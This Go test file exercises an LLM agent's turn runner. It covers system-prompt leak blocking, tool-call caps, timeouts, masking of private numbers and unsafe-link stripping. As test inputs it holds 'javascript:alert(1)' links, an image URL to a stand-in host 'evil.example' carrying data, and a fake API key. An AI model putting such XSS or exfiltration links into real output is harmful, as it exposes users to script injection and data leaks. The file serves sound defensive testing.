//go:build test

package usecase_test

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"iter"
	"net/http"
	"net/http/httptest"
	"os"
	"runtime"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/Mikimoto/cuirass/internal/entity"
	"github.com/Mikimoto/cuirass/internal/repository"
	"github.com/Mikimoto/cuirass/internal/repository/providers/anthropic"
	"github.com/Mikimoto/cuirass/internal/repository/providers/google"
	"github.com/Mikimoto/cuirass/internal/repository/providers/openai"
	stubp "github.com/Mikimoto/cuirass/internal/repository/providers/stub"
	. "github.com/Mikimoto/cuirass/internal/usecase"
)

const turnSystem = "你是台股助理,只回答台灣股市相關問題,回答要附資料來源與日期。"

// turnRec 同時是稽核 sink 與事件紀錄;上鎖:被放棄的 goroutine 可能晚到。
type turnRec struct {
	mu     sync.Mutex
	events []Event
	audits []entity.AuditEvent
}

func (r *turnRec) Write(e entity.AuditEvent) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.audits = append(r.audits, e)
	return true
}

func (r *turnRec) on(e Event) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.events = append(r.events, e)
}

func (r *turnRec) evs() []Event {
	r.mu.Lock()
	defer r.mu.Unlock()
	return slices.Clone(r.events)
}

func (r *turnRec) kinds() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	var out []string
	for _, a := range r.audits {
		out = append(out, a.Kind)
	}
	return out
}

func (r *turnRec) audit(kind string) *entity.AuditEvent {
	r.mu.Lock()
	defer r.mu.Unlock()
	for i := range r.audits {
		if r.audits[i].Kind == kind {
			a := r.audits[i]
			return &a
		}
	}
	return nil
}

func (r *turnRec) ends() []string {
	var out []string
	for _, e := range r.evs() {
		if e.Type == "turn_end" {
			out = append(out, e.Reason)
		}
	}
	return out
}

func (r *turnRec) message(final bool) *Event {
	for _, e := range r.evs() {
		if e.Type == "message" && e.Final == final {
			return &e
		}
	}
	return nil
}

// fakeLLM:stream 由測試決定。
type fakeLLM struct {
	privacy entity.Privacy
	stream  func(ctx context.Context, req LLMRequest, yield func(LLMEvent) bool)
}

func (f *fakeLLM) Name() string            { return "scripted" }
func (f *fakeLLM) Model() string           { return "m" }
func (f *fakeLLM) Privacy() entity.Privacy { return f.privacy }
func (f *fakeLLM) ContextWindow() int      { return 1000 }
func (f *fakeLLM) MaxTokens() int          { return 4096 }
func (f *fakeLLM) Stream(ctx context.Context, req LLMRequest) iter.Seq[LLMEvent] {
	return func(yield func(LLMEvent) bool) { f.stream(ctx, req, yield) }
}

func doneEv(content []entity.Part, privacy entity.Privacy, stop string) LLMEvent {
	return LLMEvent{Type: LLMEventDone, Message: &entity.Message{
		Role: entity.RoleAssistant, Content: content, Privacy: privacy, Ts: 1, Provider: "scripted", StopReason: stop,
	}}
}

func textPart(s string) entity.Part { return entity.Part{Type: entity.PartText, Text: s} }

// scripted:每次 stream 回一則指定內容的訊息。
func scripted(contents [][]entity.Part, privacy entity.Privacy, onReq func(LLMRequest)) *fakeLLM {
	return &fakeLLM{privacy: privacy, stream: func(_ context.Context, req LLMRequest, yield func(LLMEvent) bool) {
		if onReq != nil {
			onReq(req)
		}
		content := []entity.Part{textPart("完")}
		if len(contents) > 0 {
			content, contents = contents[0], contents[1:]
		}
		stop := "stop"
		for _, p := range content {
			if p.Type == entity.PartToolCall {
				stop = "toolUse"
			}
		}
		yield(doneEv(content, privacy, stop))
	}}
}

func echoTool(calls *[]map[string]any) entity.ToolDef {
	return entity.ToolDef{
		Name: "t", Description: "d",
		Parameters: entity.Schema{"type": "object", "additionalProperties": false, "properties": map[string]any{"q": map[string]any{"type": "string"}}},
		Effects:    entity.EffectsNone,
		Execute: func(_ context.Context, args map[string]any, _ entity.ToolCtx) (entity.ToolOutput, error) {
			if calls != nil {
				*calls = append(*calls, args)
			}
			return entity.ToolOutput{Content: map[string]any{"ok": true}, Details: map[string]any{"price": 512.5}}, nil
		},
	}
}

type turnOpts struct {
	provider    LLMProvider
	script      []stubp.Step
	limits      func(*entity.Limits)
	verifiers   []Verifier
	masking     Masking
	maskSet     *entity.MaskSet
	leakSources func() []string
	timeout     time.Duration
	tool        *entity.ToolDef
}

type turnH struct {
	deps TurnDeps
	rec  *turnRec
	mu   sync.Mutex
	p    LLMProvider
}

func (h *turnH) setProvider(p LLMProvider) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.p = p
}

func newTurnH(o turnOpts) *turnH {
	l := entity.DefaultLimits()
	if o.limits != nil {
		o.limits(&l)
	}
	h := &turnH{rec: &turnRec{}, p: o.provider}
	if h.p == nil {
		script := o.script
		h.p = stubp.New(stubp.Options{Script: &script})
	}
	em := &Emitter{}
	em.On(h.rec.on)
	tool := echoTool(nil)
	if o.tool != nil {
		tool = *o.tool
	}
	if o.timeout == 0 {
		o.timeout = time.Duration(l.TurnTimeoutMs) * time.Millisecond
	}
	if o.maskSet == nil {
		o.maskSet = entity.NewMaskSet()
	}
	if o.leakSources == nil {
		o.leakSources = func() []string { return []string{turnSystem} }
	}
	h.deps = TurnDeps{
		AgentID: "main",
		Provider: func() LLMProvider {
			h.mu.Lock()
			defer h.mu.Unlock()
			return h.p
		},
		System:      func() string { return turnSystem },
		LeakSources: o.leakSources,
		Tools:       map[string]entity.ToolDef{tool.Name: tool},
		Policy:      entity.Policy{Tools: []string{tool.Name}, Limits: l},
		Budget:      entity.NewBudget(l, nil),
		Audit:       h.rec,
		Emit:        em,
		HTTP: func(context.Context, string, entity.HTTPOptions) (entity.HTTPResponse, error) {
			return entity.HTTPResponse{Status: 200}, nil
		},
		TurnTimeout: o.timeout,
		MaskSet:     o.maskSet,
		Masking:     o.masking,
		Verifiers:   o.verifiers,
		NumberBook:  entity.NewNumberBook(entity.DefaultNumberBookMax),
	}
	return h
}

func (h *turnH) runCtx(t *testing.T, ctx context.Context, history []entity.Message, user entity.Message) TurnResult {
	t.Helper()
	res, err := RunTurn(ctx, history, user, h.deps)
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func (h *turnH) run(t *testing.T, history []entity.Message, user entity.Message) TurnResult {
	t.Helper()
	return h.runCtx(t, context.Background(), history, user)
}

func userMsg(text string, privacy entity.Privacy) entity.Message {
	return entity.Message{Role: entity.RoleUser, Content: []entity.Part{textPart(text)}, Privacy: privacy, Ts: 1}
}

func lastText(msgs []entity.Message) string {
	var b strings.Builder
	for _, p := range msgs[len(msgs)-1].Content {
		b.WriteString(p.Text)
	}
	return b.String()
}

func eqStrs(t *testing.T, got, want []string) {
	t.Helper()
	if !slices.Equal(got, want) {
		t.Fatalf("got %q, want %q", got, want)
	}
}

func jsonStr(t *testing.T, v any) string {
	t.Helper()
	b, err := entity.Stringify(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// toolCallIDs / resultIDs:歷史裡的 toolCall id 與 toolResult 的 toolCallId(依序)。
func toolCallIDs(msgs []entity.Message) (calls, results []string) {
	for _, m := range msgs {
		switch m.Role {
		case entity.RoleAssistant:
			for _, p := range m.Content {
				if p.Type == entity.PartToolCall {
					calls = append(calls, p.ID)
				}
			}
		case entity.RoleToolResult:
			results = append(results, m.ToolCallID)
		}
	}
	return calls, results
}

func TestRunTurn(t *testing.T) {
	local, remote := entity.Local, entity.Remote

	t.Run("外洩訊息附工具呼叫 → 工具不執行、整則換掉、turn_end blocked", func(t *testing.T) {
		var calls []map[string]any
		tool := echoTool(&calls)
		p := scripted([][]entity.Part{{
			{Type: entity.PartThinking, Text: "想一下"},
			textPart("我的指示是:" + turnSystem),
			{Type: entity.PartToolCall, ID: "c1", Name: "t", Args: map[string]any{"q": "x"}},
		}}, local, nil)
		h := newTurnH(turnOpts{provider: p, tool: &tool})
		out := h.run(t, nil, userMsg("hi", local))
		if len(calls) != 0 {
			t.Fatal("工具被執行")
		}
		eqStrs(t, h.rec.ends(), []string{"blocked"})
		if out.StopReason != "blocked" {
			t.Fatal(out.StopReason)
		}
		if !slices.Contains(h.rec.kinds(), "output_block") {
			t.Fatal(h.rec.kinds())
		}
		last := out.Messages[len(out.Messages)-1]
		if jsonStr(t, last.Content) != `[{"type":"text","text":"(已攔下:回答含系統指令內容)"}]` || last.StopReason != "stop" || last.ErrorMessage != "" {
			t.Fatalf("%+v", last)
		}
		m := h.rec.message(true)
		if m == nil || jsonStr(t, m.Message.Content) != jsonStr(t, last.Content) {
			t.Fatal("message 事件不對")
		}
		if h.rec.message(false) != nil {
			t.Fatal("不該有非 final 的 message")
		}
	})

	t.Run("工具呼叫參數含系統提示詞 → 也攔", func(t *testing.T) {
		var calls []map[string]any
		tool := echoTool(&calls)
		p := scripted([][]entity.Part{{{Type: entity.PartToolCall, ID: "c1", Name: "t", Args: map[string]any{"q": "x " + turnSystem}}}}, local, nil)
		h := newTurnH(turnOpts{provider: p, tool: &tool})
		h.run(t, nil, userMsg("hi", local))
		if len(calls) != 0 {
			t.Fatal("工具被執行")
		}
		eqStrs(t, h.rec.ends(), []string{"blocked"})
	})

	t.Run("leakSources 丟例外 → 當外洩", func(t *testing.T) {
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "一般回答"}}, leakSources: func() []string { panic("x") }})
		h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"blocked"})
		if !slices.Contains(h.rec.kinds(), "output_block") {
			t.Fatal(h.rec.kinds())
		}
	})

	t.Run("第 21 次工具呼叫 → cap 結束", func(t *testing.T) {
		var calls []map[string]any
		tool := echoTool(&calls)
		script := make([]stubp.Step, 25)
		for i := range script {
			script[i] = stubp.Step{ToolCall: &stubp.Call{Name: "t"}}
		}
		h := newTurnH(turnOpts{script: script, tool: &tool})
		out := h.run(t, nil, userMsg("hi", local))
		if len(calls) != 20 {
			t.Fatal(len(calls))
		}
		eqStrs(t, h.rec.ends(), []string{"cap"})
		_, results := toolCallIDs(out.Messages)
		if len(results) != 21 {
			t.Fatal(len(results))
		}
	})

	t.Run("模型呼叫次數超過 maxModelCallsPerTurn → cap", func(t *testing.T) {
		script := make([]stubp.Step, 5)
		for i := range script {
			script[i] = stubp.Step{ToolCall: &stubp.Call{Name: "t"}}
		}
		h := newTurnH(turnOpts{script: script, limits: func(l *entity.Limits) { l.MaxModelCallsPerTurn = 2 }})
		h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"cap"})
		if a := h.rec.audit("cap"); a == nil || a.Reason != "模型呼叫已達上限(2 次)" || a.Agent != "main" {
			t.Fatalf("%+v", a)
		}
	})

	t.Run("逾時 → turn_end timeout 且 audit timeout", func(t *testing.T) {
		release := make(chan struct{})
		t.Cleanup(func() { close(release) })
		// 不理會 ctx
		hang := &fakeLLM{privacy: local, stream: func(context.Context, LLMRequest, func(LLMEvent) bool) { <-release }}
		h := newTurnH(turnOpts{provider: hang, timeout: 20 * time.Millisecond})
		out := h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"timeout"})
		if out.StopReason != "timeout" {
			t.Fatal(out.StopReason)
		}
		if a := h.rec.audit("timeout"); a == nil || a.Reason != "20ms" {
			t.Fatalf("%+v", a)
		}
		var notice string
		for _, e := range h.rec.evs() {
			if e.Type == "notice" {
				notice = e.Text
			}
		}
		if notice != "✗ 本輪逾時已中止(0 秒)" {
			t.Fatalf("%q", notice)
		}
	})

	t.Run("外部 abort → turn_end aborted", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		release := make(chan struct{})
		t.Cleanup(func() { close(release) })
		hang := &fakeLLM{privacy: local, stream: func(context.Context, LLMRequest, func(LLMEvent) bool) {
			cancel()
			<-release
		}}
		h := newTurnH(turnOpts{provider: hang})
		h.runCtx(t, ctx, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"aborted"})
		if h.rec.audit("timeout") != nil {
			t.Fatal("abort 不該寫 timeout")
		}
	})

	t.Run("provider.stream 丟例外 → emit message、turn_end error", func(t *testing.T) {
		bad := &fakeLLM{privacy: local, stream: func(context.Context, LLMRequest, func(LLMEvent) bool) {
			panic("boom sk-ant-api03-AAAAAAAAAAAAAAAAAAAA")
		}}
		h := newTurnH(turnOpts{provider: bad})
		h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"error"})
		m := h.rec.message(true)
		if m == nil || m.Message.StopReason != "error" || strings.Contains(m.Message.ErrorMessage, "AAAA") || !strings.HasPrefix(m.Message.ErrorMessage, "boom ") {
			t.Fatalf("%+v", m)
		}
	})

	t.Run("error 結束的半截回答也拿掉不安全連結(畫面與對話紀錄)", func(t *testing.T) {
		half := &fakeLLM{privacy: local, stream: func(_ context.Context, _ LLMRequest, yield func(LLMEvent) bool) {
			yield(doneEv([]entity.Part{textPart("看 [這](javascript:alert(1)) ![x](https://evil.example/?d=S)")}, local, "error"))
		}}
		h := newTurnH(turnOpts{provider: half})
		out := h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"error"})
		m := h.rec.message(true)
		if m == nil {
			t.Fatal("沒有 final message")
		}
		for _, txt := range []string{entity.TextOf(*m.Message), lastText(out.Messages)} {
			if strings.Contains(txt, "javascript:") || strings.Contains(txt, "evil.example") {
				t.Fatalf("不安全連結沒拿掉:%q", txt)
			}
		}
	})

	t.Run("turn 自己的 goroutine 上 hook panic → turn_end error,不 crash", func(t *testing.T) {
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "ok"}}})
		h.deps.System = func() string { panic("x") }
		if out := h.run(t, nil, userMsg("hi", local)); out.StopReason != "error" || len(out.Messages) != 1 {
			t.Fatal(out)
		}
		eqStrs(t, h.rec.ends(), []string{"error"})
		h = newTurnH(turnOpts{script: []stubp.Step{{Text: "ok"}}})
		h.deps.Provider = func() LLMProvider { panic("x") }
		h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"error"})
	})

	t.Run("歷史無法複製(PrepareRequest 回 error)→ turn_end error", func(t *testing.T) {
		requests := 0
		p := stubp.New(stubp.Options{Script: &[]stubp.Step{{Text: "ok"}}, OnRequest: func(LLMRequest) { requests++ }})
		h := newTurnH(turnOpts{provider: p})
		hist := []entity.Message{{Role: entity.RoleAssistant, Content: []entity.Part{{Type: entity.PartToolCall, ID: "c0", Name: "t", Args: map[string]any{"q": badJSON{}}}}}}
		h.run(t, hist, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"error"})
		if requests != 0 {
			t.Fatal("不該送出")
		}
	})

	t.Run("error/aborted 訊息帶工具呼叫 → 不執行,每個呼叫都補上結果", func(t *testing.T) {
		for _, stop := range []string{"error", "aborted"} {
			var calls []map[string]any
			tool := echoTool(&calls)
			p := &fakeLLM{privacy: local, stream: func(_ context.Context, _ LLMRequest, yield func(LLMEvent) bool) {
				ev := doneEv([]entity.Part{
					textPart("查一下"),
					{Type: entity.PartToolCall, ID: "c1", Name: "t", Args: map[string]any{}},
					{Type: entity.PartToolCall, ID: "c2", Name: "t", Args: map[string]any{}},
				}, local, stop)
				ev.Message.ErrorMessage = "斷線"
				yield(ev)
			}}
			h := newTurnH(turnOpts{provider: p, tool: &tool})
			out := h.run(t, nil, userMsg("hi", local))
			eqStrs(t, h.rec.ends(), []string{stop})
			if len(calls) != 0 {
				t.Fatal(stop, "工具被執行")
			}
			ids, results := toolCallIDs(out.Messages)
			eqStrs(t, results, ids)
			for _, m := range out.Messages[2:] {
				if !m.IsError || entity.TextOf(m) != "已中止" {
					t.Fatalf("%+v", m)
				}
			}
		}
	})

	t.Run("回答複述 SECURITY_PREAMBLE 的句子 → 不攔", func(t *testing.T) {
		line := strings.Split(entity.SecurityPreamble, "\n")[1]
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "提醒:" + line}}, leakSources: func() []string { return []string{entity.SecurityPreamble + "\n\n" + turnSystem} }})
		out := h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"done"})
		if !strings.Contains(lastText(out.Messages), "不可信的資料") {
			t.Fatal(lastText(out.Messages))
		}
	})

	t.Run("verifier 回傳含 javascript: 連結 → 最終文字沒有", func(t *testing.T) {
		v := func(_ context.Context, s string, _ VerifyCtx) (string, error) {
			return s + " [點我](javascript:alert(1))", nil
		}
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "答案"}}, verifiers: []Verifier{v}})
		out := h.run(t, nil, userMsg("hi", local))
		if strings.Contains(lastText(out.Messages), "javascript:") {
			t.Fatal(lastText(out.Messages))
		}
		if fin := h.rec.message(true); strings.Contains(jsonStr(t, fin.Message), "javascript:") {
			t.Fatal("事件含 javascript:")
		}
	})

	t.Run("verifier 回 error 或 panic → 保留原文、結尾加未核對標記(只加一次),並 audit output_flag(R15)", func(t *testing.T) {
		boom := func(context.Context, string, VerifyCtx) (string, error) { return "", errors.New("x") }
		pan := func(context.Context, string, VerifyCtx) (string, error) { panic("x") }
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "答案"}}, verifiers: []Verifier{boom, pan, nil}})
		out := h.run(t, nil, userMsg("hi", local))
		const want = "答案\n\n⚠ 這則回答未能完成核對"
		if lastText(out.Messages) != want {
			t.Fatalf("%q", lastText(out.Messages))
		}
		if fin := h.rec.message(true); entity.TextOf(*fin.Message) != want {
			t.Fatal(entity.TextOf(*fin.Message))
		}
		n := 0
		for _, k := range h.rec.kinds() {
			if k == "output_flag" {
				n++
			}
		}
		if n != 3 || h.rec.audit("output_flag").Reason != "驗證器失敗" {
			t.Fatal(h.rec.kinds())
		}
	})

	t.Run("後面的 verifier 成功,前面失敗的標記仍保留", func(t *testing.T) {
		boom := func(context.Context, string, VerifyCtx) (string, error) { return "", errors.New("x") }
		ok := func(_ context.Context, s string, _ VerifyCtx) (string, error) { return s + "!", nil }
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "答案"}}, verifiers: []Verifier{boom, ok}})
		out := h.run(t, nil, userMsg("hi", local))
		if lastText(out.Messages) != "答案!\n\n⚠ 這則回答未能完成核對" {
			t.Fatalf("%q", lastText(out.Messages))
		}
	})

	t.Run("最終回答的不安全連結在對話紀錄也被拿掉", func(t *testing.T) {
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "看 [這裡](javascript:alert(1)) 與 https://ok.example"}}})
		out := h.run(t, nil, userMsg("hi", local))
		if s := lastText(out.Messages); strings.Contains(s, "javascript:") || !strings.Contains(s, "https://ok.example") {
			t.Fatal(s)
		}
	})

	t.Run("local 輪結束時呼叫 snapshot;之後帳本改掉,切 remote 仍遮得到", func(t *testing.T) {
		ledger := []float64{1234.5}
		snaps := 0
		masking := Masking{Snapshot: func() ([]float64, error) { snaps++; return ledger, nil }}
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "好"}}, masking: masking})
		first := h.run(t, nil, userMsg("hi", local))
		if snaps != 1 {
			t.Fatal(snaps)
		}
		ledger = []float64{9999}
		var sent string
		h.setProvider(stubp.New(stubp.Options{Privacy: remote, Script: &[]stubp.Step{{Text: "ok"}}, OnRequest: func(r LLMRequest) {
			b, _ := entity.Stringify(r.Messages)
			sent = string(b)
		}}))
		hist := slices.Clone(first.Messages)
		hist[0].Content = []entity.Part{textPart("我有 1234.5 股")}
		h.run(t, hist, userMsg("再問", remote))
		if strings.Contains(sent, "1234.5") || !strings.Contains(sent, entity.MASK) {
			t.Fatal(sent)
		}
	})

	t.Run("numberVerifier:複核額度用完 → 標記保留", func(t *testing.T) {
		requests := 0
		p := stubp.New(stubp.Options{Script: &[]stubp.Step{{Text: "股價 777.7 元"}}, OnRequest: func(LLMRequest) { requests++ }})
		h := newTurnH(turnOpts{provider: p, verifiers: []Verifier{NumberVerifier(0)}, limits: func(l *entity.Limits) { l.PerSession = 0 }})
		out := h.run(t, nil, userMsg("hi", local))
		if requests != 1 || !strings.Contains(lastText(out.Messages), "⚠未核對") {
			t.Fatal(requests, lastText(out.Messages))
		}
	})

	t.Run("verifier 的 ask 走送出管線:remote 時 local 數字被遮", func(t *testing.T) {
		var reqs []LLMRequest
		p := stubp.New(stubp.Options{Privacy: remote, Script: &[]stubp.Step{{Text: "答"}, {Text: "[]"}}, OnRequest: func(r LLMRequest) { reqs = append(reqs, r) }})
		var reply string
		var askErr error
		v := func(ctx context.Context, s string, vc VerifyCtx) (string, error) {
			reply, askErr = vc.Ask(ctx, "sys", "持股 4321 股")
			return s, nil
		}
		h := newTurnH(turnOpts{provider: p, verifiers: []Verifier{v}, maskSet: entity.NewMaskSet(4321)})
		h.run(t, nil, userMsg("hi", remote))
		if len(reqs) != 2 || reqs[1].System != "sys" || len(reqs[1].Tools) != 0 {
			t.Fatal(len(reqs))
		}
		sent := jsonStr(t, reqs[1].Messages)
		if strings.Contains(sent, "4321") || !strings.Contains(sent, entity.MASK) {
			t.Fatal(sent)
		}
		if reply != "[]" || askErr != nil {
			t.Fatal(reply, askErr)
		}
	})

	t.Run("系統提示詞開頭是 SECURITY_PREAMBLE", func(t *testing.T) {
		var system string
		p := stubp.New(stubp.Options{Script: &[]stubp.Step{{Text: "ok"}}, OnRequest: func(r LLMRequest) { system = r.System }})
		h := newTurnH(turnOpts{provider: p})
		h.run(t, nil, userMsg("hi", local))
		if system != entity.SecurityPreamble+"\n\n"+turnSystem {
			t.Fatal(system)
		}
	})

	t.Run("成功工具結果的 details 進 numberBook;使用者數字也進", func(t *testing.T) {
		h := newTurnH(turnOpts{script: []stubp.Step{{ToolCall: &stubp.Call{Name: "t"}}, {Text: "ok"}}})
		h.run(t, nil, userMsg("目標 345.6", local))
		v := h.deps.NumberBook.Values()
		if !slices.Contains(v, 512.5) || !slices.Contains(v, 345.6) || !strings.Contains(h.deps.NumberBook.Context(nil), "512.5") {
			t.Fatal(v)
		}
	})

	t.Run("remote 複核:跨截斷邊界的遮蔽數字不留殘段", func(t *testing.T) {
		tool := echoTool(nil)
		tool.Execute = func(context.Context, map[string]any, entity.ToolCtx) (entity.ToolOutput, error) {
			return entity.ToolOutput{Content: map[string]any{"ok": true}, Details: strings.Repeat("中", 7995) + "98765.4"}, nil
		}
		var reqs []LLMRequest
		p := stubp.New(stubp.Options{
			Privacy: remote, Script: &[]stubp.Step{{ToolCall: &stubp.Call{Name: "t"}}, {Text: "答 555.5 元"}, {Text: "[]"}},
			OnRequest: func(r LLMRequest) { reqs = append(reqs, r) },
		})
		h := newTurnH(turnOpts{provider: p, tool: &tool, verifiers: []Verifier{NumberVerifier(0)}, maskSet: entity.NewMaskSet(98765.4)})
		h.run(t, nil, userMsg("hi", remote))
		if len(reqs) != 3 {
			t.Fatal(len(reqs))
		}
		sent := jsonStr(t, reqs[2].Messages)
		if !strings.Contains(sent, "555.5") || strings.Contains(sent, "9876") {
			t.Fatal("殘段外流")
		}
	})

	t.Run("輪結束後中止還在跑的複核請求", func(t *testing.T) {
		n := 0
		started := make(chan context.Context, 1)
		p := &fakeLLM{privacy: local, stream: func(ctx context.Context, _ LLMRequest, yield func(LLMEvent) bool) {
			if n++; n == 1 {
				yield(doneEv([]entity.Part{textPart("答 555.5 元")}, local, "stop"))
				return
			}
			started <- ctx
			<-ctx.Done()
		}}
		h := newTurnH(turnOpts{provider: p, verifiers: []Verifier{NumberVerifier(200 * time.Millisecond)}})
		out := h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"done"})
		if !strings.Contains(lastText(out.Messages), "⚠未核對") {
			t.Fatal(lastText(out.Messages))
		}
		select {
		case ctx := <-started:
			if ctx.Err() == nil {
				t.Fatal("複核請求沒被中止")
			}
		case <-time.After(time.Second):
			t.Fatal("複核請求沒送出")
		}
	})

	t.Run("Ask 拿到不相干的 ctx:輪結束時請求照樣被取消", func(t *testing.T) {
		n := 0
		started, inStream := make(chan context.Context, 1), make(chan struct{})
		p := &fakeLLM{privacy: local, stream: func(ctx context.Context, _ LLMRequest, yield func(LLMEvent) bool) {
			if n++; n == 1 {
				yield(doneEv([]entity.Part{textPart("答")}, local, "stop"))
				return
			}
			started <- ctx
			close(inStream)
			<-ctx.Done()
		}}
		v := func(_ context.Context, s string, vc VerifyCtx) (string, error) {
			go func() { _, _ = vc.Ask(context.Background(), "sys", "u") }()
			<-inStream // 請求已送出才返回,驗證器本身不等它
			return s, nil
		}
		h := newTurnH(turnOpts{provider: p, verifiers: []Verifier{v}})
		h.run(t, nil, userMsg("hi", local))
		select {
		case ctx := <-started:
			select {
			case <-ctx.Done():
			case <-time.After(time.Second):
				t.Fatal("輪結束了,複核請求還在跑")
			}
		case <-time.After(time.Second):
			t.Fatal("複核請求沒送出")
		}
	})

	t.Run("ask 用本輪同一個 provider", func(t *testing.T) {
		var other atomic.Int32
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "答"}, {Text: "ok"}}})
		v := func(ctx context.Context, s string, vc VerifyCtx) (string, error) {
			h.setProvider(stubp.New(stubp.Options{Privacy: remote, OnRequest: func(LLMRequest) { other.Add(1) }}))
			if r, err := vc.Ask(ctx, "sys", "u"); r != "ok" || err != nil {
				t.Error(r, err)
			}
			return s, nil
		}
		h.deps.Verifiers = append(h.deps.Verifiers, v)
		h.run(t, nil, userMsg("hi", local))
		if other.Load() != 0 {
			t.Fatal("ask 用了別的 provider")
		}
	})

	t.Run("numberBook 步驟失敗(HideResult panic)→ 工具結果仍在,輪照常結束", func(t *testing.T) {
		h := newTurnH(turnOpts{
			script:  []stubp.Step{{ToolCall: &stubp.Call{Name: "t"}}, {Text: "ok"}},
			masking: Masking{HideResult: func(string) (string, bool) { panic("x") }},
		})
		out := h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"done"})
		if _, results := toolCallIDs(out.Messages); len(results) != 1 {
			t.Fatal(results)
		}
		// Add 在 hideResult 之前:數字照收,資料不收
		if !slices.Contains(h.deps.NumberBook.Values(), 512.5) || h.deps.NumberBook.Context(nil) != "" {
			t.Fatal(h.deps.NumberBook.Context(nil))
		}
	})

	t.Run("驗證器階段 remote 快照到的數字併回共用 MaskSet", func(t *testing.T) {
		n := 0
		masking := Masking{Snapshot: func() ([]float64, error) { n++; return []float64{float64(110 * n)}, nil }}
		v := func(_ context.Context, s string, vc VerifyCtx) (string, error) {
			if vc.Mask("x 220 y") != "x "+entity.MASK+" y" {
				t.Error("Mask 沒遮")
			}
			return s, nil
		}
		p := stubp.New(stubp.Options{Privacy: remote, Script: &[]stubp.Step{{Text: "答"}}})
		h := newTurnH(turnOpts{provider: p, masking: masking, verifiers: []Verifier{v}})
		h.run(t, nil, userMsg("hi", remote))
		if !h.deps.MaskSet.Has(110) || !h.deps.MaskSet.Has(220) {
			t.Fatal(h.deps.MaskSet.Values())
		}
	})

	t.Run("verifier 貼進系統提示詞 → 最終回答也攔", func(t *testing.T) {
		v := func(_ context.Context, s string, _ VerifyCtx) (string, error) { return s + "\n" + turnSystem, nil }
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "答"}}, verifiers: []Verifier{v}})
		out := h.run(t, nil, userMsg("hi", local))
		eqStrs(t, h.rec.ends(), []string{"blocked"})
		if !slices.Contains(h.rec.kinds(), "output_block") || lastText(out.Messages) != "(已攔下:回答含系統指令內容)" {
			t.Fatal(lastText(out.Messages))
		}
	})
}

// R13:text_delta 先送(未經檢查),最終 message 以 done 的內容為準;thinking_delta 不轉發。
func TestTurnTextDeltaThenFinal(t *testing.T) {
	p := &fakeLLM{privacy: entity.Local, stream: func(_ context.Context, _ LLMRequest, yield func(LLMEvent) bool) {
		_ = yield(LLMEvent{Type: LLMEventThinkingDelta, Text: "想"}) &&
			yield(LLMEvent{Type: LLMEventTextDelta, Text: "草稿"}) &&
			yield(LLMEvent{Type: LLMEventNotice, Text: "• 提示"}) &&
			yield(doneEv([]entity.Part{textPart("定稿")}, entity.Local, "stop"))
	}}
	h := newTurnH(turnOpts{provider: p})
	out := h.run(t, nil, userMsg("hi", entity.Local))
	var types []string
	for _, e := range h.rec.evs() {
		types = append(types, e.Type)
	}
	eqStrs(t, types, []string{"turn_start", "text_delta", "notice", "message", "turn_end"})
	evs := h.rec.evs()
	if evs[1].Text != "草稿" || evs[2].Text != "• 提示" || entity.TextOf(*evs[3].Message) != "定稿" || !evs[3].Final {
		t.Fatalf("%+v", evs)
	}
	if lastText(out.Messages) != "定稿" || len(out.Messages) != 2 {
		t.Fatal(out.Messages)
	}
}

// R16:hideResult 的工具資料不進複核脈絡(複核送 remote);hideResult panic 也一樣。
func TestTurnHideResultNotInReview(t *testing.T) {
	hides := map[string]func(string) (string, bool){
		"隱藏":    func(n string) (string, bool) { return "(持股已隱藏)", n == "t" },
		"panic": func(string) (string, bool) { panic("x") },
	}
	for name, hide := range hides {
		t.Run(name, func(t *testing.T) {
			tool := echoTool(nil)
			tool.Execute = func(context.Context, map[string]any, entity.ToolCtx) (entity.ToolOutput, error) {
				return entity.ToolOutput{Content: "x", Details: map[string]any{"holdings": []any{map[string]any{"name": "SECRETNAME", "shares": 1000.0}}}}, nil
			}
			var reqs []LLMRequest
			p := stubp.New(stubp.Options{
				Privacy: entity.Remote, Script: &[]stubp.Step{{ToolCall: &stubp.Call{Name: "t"}}, {Text: "你的報酬 12.34%"}, {Text: "[]"}},
				OnRequest: func(r LLMRequest) { reqs = append(reqs, r) },
			})
			var data string
			spy := func(_ context.Context, s string, vc VerifyCtx) (string, error) { data = vc.ToolData(); return s, nil }
			h := newTurnH(turnOpts{provider: p, tool: &tool, masking: Masking{HideResult: hide}, verifiers: []Verifier{spy, NumberVerifier(0)}})
			h.run(t, nil, userMsg("報酬?", entity.Remote))
			if len(reqs) != 3 {
				t.Fatal(len(reqs))
			}
			if strings.Contains(jsonStr(t, reqs), "SECRETNAME") || strings.Contains(data, "SECRETNAME") {
				t.Fatal("隱藏的工具資料外流")
			}
		})
	}
}

